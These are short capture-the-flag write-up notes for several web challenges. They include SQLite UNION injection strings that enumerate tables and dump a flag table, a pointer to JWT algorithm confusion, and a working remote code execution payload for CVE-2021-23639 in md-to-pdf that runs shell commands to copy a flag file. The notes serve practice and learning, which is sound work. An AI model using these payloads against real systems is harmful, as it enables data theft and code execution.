## WEB

### Templeted

### LoveTok

### Toxic

### petpetrcb

### Under Construction
JWT Algorithm Confusion -> https://portswigger.net/web-security/jwt/algorithm-confusion

Next SQL Injection (SQLite3)
```
# Get Tables
user_in_database' union select name,NULL from sqlite_master where type='table' and name not like 'sqlite_%';-- 

# Get Columns
user_in_database' union select sql,NULL from sqlite_master where tbl_name = 'users' and type = 'table';--

# Get Flag
user_in_database' and 1=2 UNION SELECT *,NULL from flag_storage;--
```



### Blinker Fluids `CVE-2021-23639`
md-to-pdf < 5.0.0 RCE
Payload:
```
const { mdToPdf } = require('md-to-pdf'); var payload = '---js\n((require("child_process")).execSync("id > /tmp/RCE.txt"))\n---RCE';
```
Payload for this challenge:
```
# In request:
"---js\n((require(\"child_process\")).execSync(\"cd .. && cat flag.txt > /app/static/instances/RCE.txt\"))\n---RCE;"

# In PDF editor on site:
---js
  ((require(\"child_process\")).execSync(\"cd .. && cat flag.txt > /app/static/instances/RCE.txt\"))
---RCE;

```
